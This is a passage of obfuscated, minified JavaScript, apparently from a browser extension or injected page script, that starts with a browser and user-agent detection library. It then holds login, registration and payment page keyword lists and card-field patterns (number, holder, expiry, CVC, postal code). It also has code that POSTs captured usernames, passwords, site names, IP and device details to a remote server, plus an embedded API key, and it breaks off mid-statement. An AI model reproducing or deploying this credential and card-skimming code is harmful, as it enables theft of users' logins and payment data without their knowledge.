://en.wikipedia.org/wiki/Dooble'}],'cost':_0x2f793a(0x5d0),'status':'Active','licence':[{'name':'BSD','link':_0x2f793a(0x23a)}],'layout':[{'name':'Blink','link':_0x2f793a(0x496)}],'latest-release':[{'version':_0x2f793a(0x478),'date':'October\x2010,\x202020'}]},'ELinks':{'name':_0x2f793a(0x5c4),'type':'Web\x20Browser','ui':'TextBasedMode','creator':[{'name':'Baudis,\x20Fonseca,\x20et\x20al.','link':'https://en.wikipedia.org/wiki/ELinks'}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x3e4),'licence':[{'name':_0x2f793a(0x43c),'link':_0x2f793a(0x4a0)}],'layout':[{'name':_0x2f793a(0x26b),'note':_0x2f793a(0x38e)}],'latest-release':[{'version':'0.11.7','date':_0x2f793a(0x3bf)}]},'Epiphany':{'name':'GNOME\x20Web','type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x26e),'link':'https://www.gnome.org/news/2015/05/goodbye-marco/'},{'name':_0x2f793a(0x479),'link':_0x2f793a(0x409)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x43c),'link':_0x2f793a(0x4a0)}],'layout':[{'name':_0x2f793a(0x2d7),'link':_0x2f793a(0x344)}],'latest-release':{'Stable\x20release':{'version':_0x2f793a(0x4cb),'date':_0x2f793a(0x235)},'Preview\x20release':{'version':_0x2f793a(0x304),'date':_0x2f793a(0x47b)}}},'Links':{'name':_0x2f793a(0x3d5),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':'Patocka,\x20et\x20al','link':'https://en.wikipedia.org/wiki/Links_(web_browser)'}],'cost':'Free','status':_0x2f793a(0x488),'licence':[{'name':'GPL','link':_0x2f793a(0x4a0)}],'layout':[{'name':_0x2f793a(0x26b)}],'latest-release':[{'version':_0x2f793a(0x38a),'date':_0x2f793a(0x5c7)}]},'Flock':{'name':_0x2f793a(0x1f6),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x506),'link':[_0x2f793a(0x2f2),_0x2f793a(0x4eb)]}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x3e4),'licence':[{'name':_0x2f793a(0x39f),'note':_0x2f793a(0x48a),'link':_0x2f793a(0x202)}],'layout':[{'name':'WebKit','link':_0x2f793a(0x39b)}],'latest-release':[{'version':_0x2f793a(0x56b),'date':_0x2f793a(0x316)}]},'Waterfox':{'name':'Waterfox\x20Browser','type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x2d1)}],'cost':'Free','status':_0x2f793a(0x488),'licence':[{'name':'GPL','link':_0x2f793a(0x4a0)}],'layout':[{'name':_0x2f793a(0x3d0),'link':_0x2f793a(0x57d)}],'latest-release':[{'version':_0x2f793a(0x4d1),'date':_0x2f793a(0x421)}]},'Eolie':{'name':'Eolie\x20Browser','type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':'Mozilla\x20Foundation','link':_0x2f793a(0x351)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x35f),'link':_0x2f793a(0x560)}],'layout':[{'name':_0x2f793a(0x3d0),'note':'(before\x20v57)','link':_0x2f793a(0x57d)},{'name':_0x2f793a(0x2aa),'note':_0x2f793a(0x41b),'link':_0x2f793a(0x4f5)}],'latest-release':{'Standard':{'version':'82.0','date':_0x2f793a(0x5a7)},'Extended\x20Support\x20Release':{'version':_0x2f793a(0x225),'date':_0x2f793a(0x5a7)}}},'PaleMoon':{'name':_0x2f793a(0x446),'type':_0x2f793a(0x4c2),'ui':'GraphicalMode','creator':[{'name':_0x2f793a(0x309)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x35f),'link':'https://en.wikipedia.org/wiki/Mozilla_Public_License'}],'layout':[{'name':'Goanna','link':_0x2f793a(0x3fb)}],'latest-release':{'Standard':{'version':_0x2f793a(0x294),'date':_0x2f793a(0x2f5)}}},'SeaMonkey':{'name':_0x2f793a(0x452),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x572)}],'cost':'Free','status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x35f),'link':'https://en.wikipedia.org/wiki/Mozilla_Public_License'}],'layout':[{'name':_0x2f793a(0x3d0),'link':'https://en.wikipedia.org/wiki/Gecko_(layout_engine)'}],'latest-release':{'Stable\x20release':{'version':_0x2f793a(0x49f),'date':'September\x2022,\x202020'},'Preview\x20release':{'version':_0x2f793a(0x432),'date':_0x2f793a(0x3f5)}}},'SalamWeb':{'name':'SalamWeb\x20Browser','type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x441),'link':_0x2f793a(0x2dc)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':'Freeware','link':'https://en.wikipedia.org/wiki/Freeware'}],'layout':[{'name':'Blink','link':_0x2f793a(0x496)}],'latest-release':{'Windows':{'version':_0x2f793a(0x594),'date':_0x2f793a(0x527)},'Android':{'version':'4.5.0.40','date':'June\x2025,\x202020'},'macOS':{'version':_0x2f793a(0x594),'date':_0x2f793a(0x30f)},'iOS':{'version':'4.5','date':'June\x2020,\x202020'}}},'firefox':{'name':'Firefox\x20Browser','type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x58b),'link':_0x2f793a(0x351)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x35f),'link':_0x2f793a(0x560)}],'layout':[{'name':_0x2f793a(0x3d0),'note':'(before\x20v57)','link':_0x2f793a(0x57d)},{'name':_0x2f793a(0x2aa),'note':_0x2f793a(0x41b),'link':_0x2f793a(0x4f5)}],'latest-release':{'Standard':{'version':_0x2f793a(0x38f),'date':_0x2f793a(0x5a7)},'Extended\x20Support\x20Release':{'version':_0x2f793a(0x225),'date':_0x2f793a(0x5a7)}}},'Galeon':{'name':_0x2f793a(0x4c6),'type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x26e),'link':_0x2f793a(0x207)}],'cost':'Free','status':_0x2f793a(0x3e4),'licence':[{'name':'GPL','link':_0x2f793a(0x4a0)}],'layout':[{'name':_0x2f793a(0x3d0),'link':_0x2f793a(0x57d)}],'latest-release':[{'version':_0x2f793a(0x47d),'date':_0x2f793a(0x2b6)}]},'iCab':{'name':_0x2f793a(0x58d),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':'Alexander\x20Clauss','link':_0x2f793a(0x3bc)}],'cost':'Free,\x20$20\x20(Pro)','status':'Active','licence':[{'name':'Proprietary\x20(browser)','link':_0x2f793a(0x202)},{'name':_0x2f793a(0x30d),'link':_0x2f793a(0x357)}],'layout':[{'name':_0x2f793a(0x38b),'link':'https://en.wikipedia.org/wiki/WebKit'}],'latest-release':[{'version':_0x2f793a(0x3c1),'date':_0x2f793a(0x413)}]},'curl':{'name':_0x2f793a(0x524),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x4e9),'creator':[{'name':'Daniel\x20Stenberg','link':_0x2f793a(0x1f4)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x231),'link':_0x2f793a(0x3ef)}],'latest-release':{'Stable\x20release':{'version':_0x2f793a(0x5b8),'date':_0x2f793a(0x34d)}}},'Lynx':{'name':_0x2f793a(0x3a5),'type':_0x2f793a(0x329),'ui':_0x2f793a(0x420),'creator':[{'name':_0x2f793a(0x53b)}],'cost':_0x2f793a(0x5d0),'status':'Active','licence':[{'name':_0x2f793a(0x43c),'link':_0x2f793a(0x4a0)}],'layout':[{'name':_0x2f793a(0x2f9),'link':_0x2f793a(0x31d)}],'latest-release':[{'version':_0x2f793a(0x574),'date':'8\x20July\x202018'}]},'msie':_0x2f793a(0x578),'Midori':{'name':_0x2f793a(0x3d6),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':_0x2f793a(0x372),'link':_0x2f793a(0x457)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':'LGPL','link':'https://en.wikipedia.org/wiki/GNU_Lesser_General_Public_License'}],'layout':[{'name':'WebKit','link':'https://en.wikipedia.org/wiki/WebKit'}],'latest-release':{'Stable\x20release':[],'Preview\x20release':{'version':'9.0','date':'July\x2029,\x202019'}}},'NetSurf':{'name':_0x2f793a(0x4f9),'type':'Web\x20Browser','ui':'GraphicalMode','creator':[{'name':_0x2f793a(0x209),'link':_0x2f793a(0x52a)}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x43c),'link':_0x2f793a(0x4a0)}],'layout':[{'name':_0x2f793a(0x248),'link':_0x2f793a(0x4fe)},{'name':_0x2f793a(0x3c8),'link':'https://en.wikipedia.org/wiki/QtWebKit'}],'latest-release':{'Stable\x20release':{'version':_0x2f793a(0x43e),'date':'May\x2024,\x202020'},'Preview\x20release':[]}},'Otter':{'name':_0x2f793a(0x502),'type':_0x2f793a(0x4c2),'ui':'GraphicalMode','creator':[{'name':_0x2f793a(0x379),'link':'https://otter-browser.org/'}],'cost':_0x2f793a(0x5d0),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x2a9),'link':'https://en.wikipedia.org/wiki/GNU_General_Public_License'}],'layout':[{'name':'Qt\x20WebEngine','link':'https://en.wikipedia.org/wiki/Qt_WebEngine'},{'name':_0x2f793a(0x3c8),'link':'https://en.wikipedia.org/wiki/QtWebKit'}],'latest-release':{'Stable\x20release':{'version':_0x2f793a(0x597),'date':_0x2f793a(0x450)},'Preview\x20release':{'version':_0x2f793a(0x57e),'date':'May\x2018,\x202020'}}},'Maxthon':{'name':_0x2f793a(0x42b),'type':'Web\x20Browser','ui':_0x2f793a(0x3ba),'creator':[{'name':'Maxthon\x20International\x20Ltd','link':_0x2f793a(0x3cf)}],'cost':_0x2f793a(0x4f8),'status':_0x2f793a(0x488),'licence':[{'name':'Freeware','link':_0x2f793a(0x383)}],'layout':[{'name':_0x2f793a(0x38b),'link':_0x2f793a(0x39b)},{'name':_0x2f793a(0x236),'link':_0x2f793a(0x39a)}],'latest-release':{'Windows':{'version':_0x2f793a(0x348),'date':_0x2f793a(0x516)},'Android':{'version':_0x2f793a(0x355),'date':_0x2f793a(0x292)},'macOS':{'version':_0x2f793a(0x5ae),'date':_0x2f793a(0x559)},'iOS':{'version':_0x2f793a(0x279),'date':_0x2f793a(0x3dc)},'Windows\x20Phone':{'version':_0x2f793a(0x2e4),'date':_0x2f793a(0x4ec)},'Linux':{'version':'1.0.5.3','date':_0x2f793a(0x44e)}}},'safari':{'name':_0x2f793a(0x4df),'type':_0x2f793a(0x4c2),'ui':_0x2f793a(0x3ba),'creator':[{'name':'Apple\x20Inc.','link':_0x2f793a(0x52e)}],'cost':_0x2f793a(0x526),'status':_0x2f793a(0x488),'licence':[{'name':_0x2f793a(0x362),'link':_0x2f793a(0x202)},{'name':_0x2f793a(0x368),'link':_0x2f793a(0x357)}],'layout':[{'name':_0x2f793a(0x38b),'link':_0x2f793a(0x39b)}],'latest-release':{'macOS':{'version':_0x2f793a(0x41a),'date':_0x2f793a(0x20e)},'iOS':{'version':'14.0','date':_0x2f793a(0x20e)}}}},this[_0x2f793a(0x27b)]={'EdgeHTML':{'name':_0x2f793a(0x395),'developer':_0x2f793a(0x21d),'contain':_0x2f793a(0x540),'contain_example':_0x2f793a(0x37e)},'Blink':{'name':'Blink','developer':_0x2f793a(0x32c),'contain':_0x2f793a(0x325),'contain_example':_0x2f793a(0x3ab)},'Gecko':{'name':_0x2f793a(0x3d0),'developer':'Mozilla\x20Foundation','contain':'Gecko','contain_example':_0x2f793a(0x27a)},'Goanna':{'name':_0x2f793a(0x301),'developer':_0x2f793a(0x309),'contain':_0x2f793a(0x301),'contain_example':_0x2f793a(0x5b1)},'KHTML':{'name':_0x2f793a(0x3d7),'developer':_0x2f793a(0x2a4),'contain':_0x2f793a(0x3d7),'contain_example':_0x2f793a(0x40e)},'Presto':{'name':'Presto','developer':'Opera\x20Software','contain':_0x2f793a(0x36b),'contain_example':_0x2f793a(0x396)},'Tasman':{'name':_0x2f793a(0x529),'developer':_0x2f793a(0x21d),'contain':_0x2f793a(0x529),'contain_example':_0x2f793a(0x54e)},'Trident':{'name':'Trident','developer':_0x2f793a(0x21d),'contain':'Trident','contain_example':_0x2f793a(0x2f0)},'WebKit':{'name':_0x2f793a(0x38b),'developer':_0x2f793a(0x3d1),'contain':'AppleWebKit','contain_example':_0x2f793a(0x3b6)},'Servo':{'name':'Servo','developer':_0x2f793a(0x27d),'contain':_0x2f793a(0x267),'contain_example':'Servo/xyz'},'libwww-FM':{'name':_0x2f793a(0x296),'developer':'Tim\x20Berners-Lee','contain':_0x2f793a(0x296),'contain_example':_0x2f793a(0x56f)}},this[_0x2f793a(0x5a2)]=[{'name':_0x2f793a(0x419),'code':_0x2f793a(0x310)}],this[_0x2f793a(0x58e)]();}[_0x4f9c7e(0x58e)](){const _0x11008b=_0x4f9c7e,_0x3d9346=this;let _0x51e400=_0x3d9346['cleanUserAgentString'](this[_0x11008b(0x20c)]);Array[_0x11008b(0x313)](_0x3d9346[_0x11008b(0x5a2)])&&_0x3d9346['webBrowserAppCodeNameList'][_0x11008b(0x43f)](_0x2420e5=>{const _0x52df34=_0x11008b;-0x1!==_0x51e400[_0x52df34(0x3ff)](_0x2420e5[_0x52df34(0x4bd)]['toLowerCase']())&&(_0x3d9346['browserAppName']=_0x2420e5[_0x52df34(0x447)],_0x51e400[_0x52df34(0x4aa)]('\x20')[_0x52df34(0x43f)](function(_0x2a23ae){const _0x45819e=_0x52df34;-0x1!==_0x2a23ae[_0x45819e(0x3ff)](_0x2420e5[_0x45819e(0x4bd)][_0x45819e(0x52c)]())&&(_0x3d9346[_0x45819e(0x48f)]=_0x2a23ae[_0x45819e(0x260)]('/','\x20')[_0x45819e(0x260)](_0x2420e5[_0x45819e(0x4bd)],_0x2420e5[_0x45819e(0x447)]),console[_0x45819e(0x3a3)](_0x3d9346[_0x45819e(0x48f)]),_0x3d9346['browserAppVersion']=_0x2a23ae['substr'](_0x2420e5['name'][_0x45819e(0x52c)]()[_0x45819e(0x461)]+0x1,_0x2a23ae[_0x45819e(0x461)]-(_0x2420e5[_0x45819e(0x4bd)]['toLowerCase']()[_0x45819e(0x461)]+0x1)),console[_0x45819e(0x3a3)](_0x3d9346[_0x45819e(0x3f9)]));}));});}['getURLProtocol'](){const _0x2406f5=_0x4f9c7e;return this[_0x2406f5(0x1f7)];}[_0x4f9c7e(0x46d)](){const _0x2e7dd5=_0x4f9c7e;return this[_0x2e7dd5(0x373)];}['getURLPath'](){const _0x4f7f3a=_0x4f9c7e;return this[_0x4f7f3a(0x50f)];}[_0x4f9c7e(0x4fb)](){const _0x2c6dc5=_0x4f9c7e;return this[_0x2c6dc5(0x35e)];}['gerDeviceScreenHeight'](){const _0x7a8927=_0x4f9c7e;return this[_0x7a8927(0x28c)];}[_0x4f9c7e(0x36a)](){const _0x2d6eb8=_0x4f9c7e;return this[_0x2d6eb8(0x4d6)];}[_0x4f9c7e(0x2fa)](){const _0x7f82f6=_0x4f9c7e;return this[_0x7f82f6(0x223)];}[_0x4f9c7e(0x497)](){const _0x15b5ff=_0x4f9c7e;return this[_0x15b5ff(0x55a)];}[_0x4f9c7e(0x2a8)](){const _0x38910c=_0x4f9c7e;return this[_0x38910c(0x371)];}[_0x4f9c7e(0x2d2)](){const _0x277f46=_0x4f9c7e;return this[_0x277f46(0x268)];}[_0x4f9c7e(0x4de)](){const _0x382007=_0x4f9c7e;return this[_0x382007(0x20c)];}[_0x4f9c7e(0x5a6)](){const _0x448d50=_0x4f9c7e;return this[_0x448d50(0x4c9)];}['getArchitectureList'](){const _0x3e53ae=_0x4f9c7e;return this[_0x3e53ae(0x333)];}[_0x4f9c7e(0x3a7)](){const _0x25c273=_0x4f9c7e;return this[_0x25c273(0x5a2)];}[_0x4f9c7e(0x56d)](){const _0x58ea42=_0x4f9c7e;return this[_0x58ea42(0x4c4)];}['getWebBrowserLayoutList'](){const _0x25361a=_0x4f9c7e;return this[_0x25361a(0x27b)];}[_0x4f9c7e(0x28b)](){const _0x4e42f3=_0x4f9c7e;return this[_0x4e42f3(0x36c)];}[_0x4f9c7e(0x2f4)](){const _0x39059c=_0x4f9c7e;return this[_0x39059c(0x2ba)];}['getUserAgentList'](){const _0x189a2e=_0x4f9c7e;return this[_0x189a2e(0x288)];}[_0x4f9c7e(0x3d2)](){const _0x52e7d0=_0x4f9c7e;return this[_0x52e7d0(0x387)][_0x52e7d0(0x45b)]();}[_0x4f9c7e(0x315)](){const _0x58200b=_0x4f9c7e;return this[_0x58200b(0x401)][_0x58200b(0x45b)]();}[_0x4f9c7e(0x1f8)](){const _0x1ea9bb=_0x4f9c7e;return this[_0x1ea9bb(0x58a)];}[_0x4f9c7e(0x47a)](){const _0x1a68ef=_0x4f9c7e;return this['browserAppCodeName'][_0x1a68ef(0x45b)]();}[_0x4f9c7e(0x32a)](){return this['browserAppCodeVersion']['trim']();}[_0x4f9c7e(0x41d)](){const _0x292a83=_0x4f9c7e;return this[_0x292a83(0x54d)]['trim']();}[_0x4f9c7e(0x2ec)](){const _0x2d8254=_0x4f9c7e;return this[_0x2d8254(0x54d)][_0x2d8254(0x45b)]();}[_0x4f9c7e(0x4b7)](){const _0x116f14=_0x4f9c7e;return this[_0x116f14(0x3f9)]['trim']();}[_0x4f9c7e(0x513)](){const _0x5f0142=_0x4f9c7e;return this[_0x5f0142(0x408)][_0x5f0142(0x45b)]();}['getBrowserEngineVersion'](){const _0x139dae=_0x4f9c7e;return this[_0x139dae(0x240)][_0x139dae(0x45b)]();}[_0x4f9c7e(0x23b)](){const _0x499b7e=_0x4f9c7e;return this[_0x499b7e(0x483)][_0x499b7e(0x45b)]();}[_0x4f9c7e(0x405)](){const _0x48d000=_0x4f9c7e;return this[_0x48d000(0x407)][_0x48d000(0x45b)]();}[_0x4f9c7e(0x3a1)](){const _0x497853=_0x4f9c7e;return this[_0x497853(0x5be)][_0x497853(0x45b)]();}['getBrowserVersionFull'](){const _0x537119=_0x4f9c7e;return this[_0x537119(0x2ad)][_0x537119(0x45b)]();}[_0x4f9c7e(0x330)](){const _0x143b64=_0x4f9c7e;return this[_0x143b64(0x31e)];}[_0x4f9c7e(0x339)](){const _0x5df166=_0x4f9c7e;return this['deviceName'][_0x5df166(0x45b)]();}[_0x4f9c7e(0x5b4)](){const _0x5776f4=_0x4f9c7e;return this[_0x5776f4(0x551)]['trim']();}[_0x4f9c7e(0x2cb)](){const _0x4f84ec=_0x4f9c7e;return this['deviceNameOriginal'][_0x4f84ec(0x45b)]();}[_0x4f9c7e(0x4a8)](){const _0x555ef1=_0x4f9c7e;return this[_0x555ef1(0x542)]['trim']();}[_0x4f9c7e(0x221)](){const _0xd934b3=_0x4f9c7e;return this[_0xd934b3(0x403)][_0xd934b3(0x45b)]();}[_0x4f9c7e(0x499)](){const _0x24a176=_0x4f9c7e;return this['deviceWindowManager'][_0x24a176(0x45b)]();}['gtDeviceDetails'](_0x174374){const _0x5b078c=_0x4f9c7e;Array['isArray'](_0x174374)&&_0x174374[_0x5b078c(0x461)]>0x0&&(_0x5b078c(0x2ed)in _0x174374?(this[_0x5b078c(0x31e)]=_0x174374[_0x5b078c(0x2ed)],this['deviceName']=_0x174374[_0x5b078c(0x2ed)][_0x5b078c(0x4bd)],this['deviceArchitecture']=_0x174374['Platform'][_0x5b078c(0x2c6)],this[_0x5b078c(0x542)]=_0x174374[_0x5b078c(0x4f0)][_0x5b078c(0x286)]):_0x5b078c(0x4db)==typeof _0x174374&&(this[_0x5b078c(0x397)]=_0x174374,this['deviceType']=_0x174374,this['currentDeviceInfo']=_0x174374));}[_0x4f9c7e(0x2e2)](){return this['deviceName'];}[_0x4f9c7e(0x35c)](){const _0x55e586=_0x4f9c7e;return this[_0x55e586(0x403)];}[_0x4f9c7e(0x515)](_0x2d8fdf){const _0x337742=_0x4f9c7e;return _0x2d8fdf[_0x337742(0x52c)]()[_0x337742(0x45b)]()[_0x337742(0x260)](_0x337742(0x3f1),_0x337742(0x2b8))['replace'](_0x337742(0x508),_0x337742(0x284));}}}},_0x46d2cc={};function _0x20f5b1(_0x36af14){const _0x102534=a8_0x2c8e;var _0x5b9c8e=_0x46d2cc[_0x36af14];if(void 0x0!==_0x5b9c8e)return _0x5b9c8e[_0x102534(0x30e)];var _0x60a6ee=_0x46d2cc[_0x36af14]={'exports':{}};return _0x1eaf90[_0x36af14](_0x60a6ee,_0x60a6ee['exports'],_0x20f5b1),_0x60a6ee['exports'];}_0x20f5b1['d']=(_0x41dd85,_0x14e602)=>{const _0xfeffcd=a8_0x2c8e;for(var _0x3e6204 in _0x14e602)_0x20f5b1['o'](_0x14e602,_0x3e6204)&&!_0x20f5b1['o'](_0x41dd85,_0x3e6204)&&Object[_0xfeffcd(0x2fd)](_0x41dd85,_0x3e6204,{'enumerable':!0x0,'get':_0x14e602[_0x3e6204]});},_0x20f5b1['o']=(_0x39a328,_0x466368)=>Object['prototype']['hasOwnProperty'][_0x2d889a(0x554)](_0x39a328,_0x466368),(()=>{const _0x33df30=_0x2d889a;var _0x4c5982=_0x20f5b1(0x21a);let _0x3fe2cd=function(_0x5bd344){const _0x4d043f=a8_0x2c8e;if(null!==document[_0x4d043f(0x2b4)](_0x5bd344))return document[_0x4d043f(0x2b4)](_0x5bd344);}(_0x33df30(0x429))[_0x33df30(0x576)];void 0x0===_0x3fe2cd&&(_0x3fe2cd='https://www.mishusoft.com/');const _0x27c574={'name':_0x33df30(0x439),'version':_0x33df30(0x1fc),'author':'Mr.\x20Al\x20Amin\x20Ahmed\x20Abir','charset':'utf8mb4','prefix':_0x33df30(0x463),'companyName':_0x33df30(0x58c),'text':{'welcome':_0x33df30(0x4ba),'description':_0x33df30(0x444),'install_state':_0x33df30(0x297)}},_0x806b40={'home':_0x33df30(0x4d0),'support':_0x33df30(0x36f),'donate':_0x33df30(0x52b),'IpInfo':_0x33df30(0x4be),'IpInfoKey':'2f9dde381f67efed325acfb1011a988036b28fc6cc02f07668ef7180','temporary':{'home':_0x33df30(0x4e0),'monitorURL':_0x33df30(0x24a),'paymentURL':_0x33df30(0x5c9)},'publish':{'home':_0x33df30(0x4d0),'monitorURL':_0x33df30(0x386),'paymentURL':_0x33df30(0x5cc)}};function _0x6804e1(_0x428dd6,_0x1dcdd1){const _0x1f288e=_0x33df30;if(null!==_0x428dd6[_0x1f288e(0x25e)]&&null!==_0x428dd6[_0x1f288e(0x509)])try{let _0x5b22a9,_0x3b5af3=new XMLHttpRequest();if(_0x3b5af3['open'](_0x428dd6[_0x1f288e(0x25e)],_0x428dd6['url'],_0x428dd6[_0x1f288e(0x4f6)]),null!==_0x428dd6[_0x1f288e(0x477)]&&_0x1f288e(0x360)==typeof _0x428dd6[_0x1f288e(0x477)]){for(let _0x1daa7c=0x0;_0x1daa7c<_0x428dd6[_0x1f288e(0x477)][_0x1f288e(0x461)];_0x1daa7c++)_0x3b5af3[_0x1f288e(0x46c)](_0x428dd6[_0x1f288e(0x477)][_0x1daa7c][_0x1f288e(0x4bd)],_0x428dd6[_0x1f288e(0x477)][_0x1daa7c][_0x1f288e(0x31c)]),-0x1!==_0x428dd6[_0x1f288e(0x477)][_0x1daa7c][_0x1f288e(0x31c)][_0x1f288e(0x3ff)](_0x1f288e(0x538))&&(_0x5b22a9='formData'),-0x1!==_0x428dd6[_0x1f288e(0x477)][_0x1daa7c][_0x1f288e(0x31c)][_0x1f288e(0x3ff)](_0x1f288e(0x5bb))&&(_0x5b22a9='jsonData');}if(null!==_0x428dd6[_0x1f288e(0x4e6)]&&_0x1f288e(0x360)==typeof _0x428dd6[_0x1f288e(0x4e6)]){if(_0x1f288e(0x25a)===_0x5b22a9&&_0x3b5af3[_0x1f288e(0x5ce)](JSON[_0x1f288e(0x451)](_0x428dd6['data'])),_0x1f288e(0x203)===_0x5b22a9){let _0x2936ab=new FormData();Object['keys'](_0x428dd6[_0x1f288e(0x4e6)])[_0x1f288e(0x43f)](function(_0x2d7d60){const _0x161938=_0x1f288e;_0x2936ab['append'](_0x2d7d60,_0x428dd6[_0x161938(0x4e6)][_0x2d7d60]);}),_0x3b5af3['send'](_0x2936ab);}}else _0x3b5af3['send']();_0x3b5af3['onreadystatechange']=function(){const _0x591e73=_0x1f288e;0x4===this[_0x591e73(0x427)]&&0xc8===this['status']&&_0x1dcdd1&&_0x1dcdd1(this['responseText']);};}catch(_0x190176){console[_0x1f288e(0x5a5)](_0x1f288e(0x3df)+_0x190176);}else console[_0x1f288e(0x5a5)](_0x1f288e(0x363));}const _0x19c4f6=new _0x4c5982['A'](),_0x1b1a45=_0x27c574[_0x33df30(0x4bd)]+'@'+_0x27c574[_0x33df30(0x47f)];let _0x165db5=_0x3fe2cd+_0x33df30(0x274);const _0x48b3d8=[{'login':[_0x33df30(0x5b2),_0x33df30(0x220),_0x33df30(0x438),_0x33df30(0x475),_0x33df30(0x44d),_0x33df30(0x442),'idb',_0x33df30(0x5c1),_0x33df30(0x2ee),'fl',_0x33df30(0x4d4),_0x33df30(0x2cc),_0x33df30(0x579),_0x33df30(0x2b3),_0x33df30(0x324),'connexion',_0x33df30(0x4ce),_0x33df30(0x4b5),'auth']},{'register':[_0x33df30(0x4d9),'signup','join','register',_0x33df30(0x214)]},{'logout':[_0x33df30(0x3f3)]},{'payment':[_0x33df30(0x2ff),_0x33df30(0x338),_0x33df30(0x557),'checkout',_0x33df30(0x346),_0x33df30(0x400),'purchase',_0x33df30(0x3ea),_0x33df30(0x3f6),_0x33df30(0x272),_0x33df30(0x212),_0x33df30(0x533)]},{'exclude':[_0x33df30(0x254),_0x33df30(0x25f),_0x33df30(0x257),_0x33df30(0x307),_0x33df30(0x477),_0x33df30(0x215),_0x33df30(0x41f),_0x33df30(0x40f),_0x33df30(0x39d),_0x33df30(0x3ec),_0x33df30(0x3b4),_0x33df30(0x3ac),_0x33df30(0x300),_0x33df30(0x4d5),_0x33df30(0x237),'applyform',_0x33df30(0x595),'comment',_0x33df30(0x390),_0x33df30(0x518),_0x33df30(0x2ac),_0x33df30(0x37b),'panier',_0x33df30(0x4da),_0x33df30(0x473),_0x33df30(0x434),'posts',_0x33df30(0x504),_0x33df30(0x467),_0x33df30(0x249),_0x33df30(0x295),'domain']}],_0x54c723=[{'cardNumber':[_0x33df30(0x59f),'no',_0x33df30(0x2a5)]},{'cardHolder':[_0x33df30(0x2c0),_0x33df30(0x3de),_0x33df30(0x4bd)]},{'cardTypes':[_0x33df30(0x23c),'type',_0x33df30(0x271)]},{'cardExpire':['exp']},{'cardCVC':['cvc',_0x33df30(0x48e),_0x33df30(0x232),_0x33df30(0x41c)]},{'cardPostalCode':['zip','post']}];function _0x31a45c(_0x2a1cd0){const _0x4b2764=_0x33df30;if('object'==typeof _0x2a1cd0&&_0x2a1cd0[_0x4b2764(0x3e7)]===Object&&0x0!==Object['keys'](_0x2a1cd0)['length']){let _0xde822b=setInterval(function(){const _0x4ba09d=_0x4b2764;if(null!==window[_0x4ba09d(0x4a9)]['getItem']('ip')){if(clearInterval(_0xde822b),_0x4ba09d(0x5c3)===_0x2a1cd0[_0x4ba09d(0x24b)]||'saveRegistrationData'===_0x2a1cd0['command']||_0x4ba09d(0x34b)===_0x2a1cd0['command']||_0x4ba09d(0x2ab)===_0x2a1cd0['command']){if(_0x4ba09d(0x5c3)===_0x2a1cd0[_0x4ba09d(0x24b)])return _0x6804e1({'method':_0x4ba09d(0x241),'url':_0x165db5+'browserUserDataManagement','async':!0x0,'header':[{'name':'Content-type','value':_0x4ba09d(0x472)}],'data':{'command':_0x2a1cd0[_0x4ba09d(0x24b)],'userdata':{'_default_':{'tracker':_0x1b1a45,'app_id':_0x27c574[_0x4ba09d(0x47f)],'ip':window[_0x4ba09d(0x4a9)][_0x4ba09d(0x22a)]('ip'),'os_name_arch':_0x19c4f6[_0x4ba09d(0x2e2)]()+'\x20'+_0x19c4f6[_0x4ba09d(0x35c)](),'browser':_0x19c4f6['getBrowserNameFull']()},'event':'login','username':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x21b)],'password':_0x2a1cd0['data'][_0x4ba09d(0x2ea)],'workWebsite':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x5aa)]}}});if('saveRegistrationData'===_0x2a1cd0[_0x4ba09d(0x24b)])return 